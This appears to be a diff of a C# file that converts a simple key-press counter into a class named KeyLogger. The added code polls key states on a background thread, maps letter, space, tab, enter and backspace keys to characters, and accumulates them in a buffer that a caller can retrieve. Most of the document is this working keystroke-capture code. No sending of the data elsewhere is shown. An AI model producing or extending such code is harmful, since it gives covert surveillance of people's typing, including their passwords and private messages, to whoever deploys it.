@@ -1,23 +1,25 @@
-using System;
-using System.Collections.Generic;
 using System.Runtime.InteropServices;
-using System.Threading;
+using System.Text;
 
-public static class KeyCounter
+public static class KeyLogger
 {
-    private static int _count = 0;
-    private static readonly HashSet<int> _held = new();
+    private static readonly StringBuilder _buffer = new();
+    private static readonly object _lock = new();
+    private static readonly HashSet<int> _held = [];
 
-    public static int ResetCount()
+    public static string GetKeys()
     {
-        int x = _count;
-        _count = 0;
-        return x;
+        lock (_lock)
+        {
+            string result = _buffer.ToString();
+            _buffer.Clear();
+            return result;
+        }
     }
 
     public static void Start()
     {
-        Thread t = new Thread(() =>
+        Thread t = new(() =>
         {
             while (true)
             {
@@ -27,15 +29,24 @@ public static class KeyCounter
 
                     if (down)
                     {
-                        if (!_held.Contains(vk))
+                        lock (_lock)
                         {
-                            _held.Add(vk);
-                            Interlocked.Increment(ref _count);
+                            if (!_held.Contains(vk))
+                            {
+                                _held.Add(vk);
+                                // Convert virtual key to character
+                                char c = GetCharFromVk(vk);
+                                if (c != '\0')
+                                    _buffer.Append(c);
+                            }
                         }
                     }
                     else
                     {
-                        _held.Remove(vk);
+                        lock (_lock)
+                        {
+                            _held.Remove(vk);
+                        }
                     }
                 }
 
@@ -45,6 +56,21 @@ public static class KeyCounter
         { IsBackground = true };
 
         t.Start();
+    }
+
+    private static char GetCharFromVk(int vk)
+    {
+        switch (vk)
+        {
+            case 0x08: return '\b'; // Backspace
+            case 0x09: return '\t'; // Tab
+            case 0x0D: return '\r'; // Enter
+            case 0x20: return ' ';
+            default:
+                if (vk >= 0x41 && vk <= 0x5A)
+                    return (char)(vk + 0x20); // Convert to lowercase
+                return '\0';
+        }
     }
 
     [DllImport("user32.dll")]
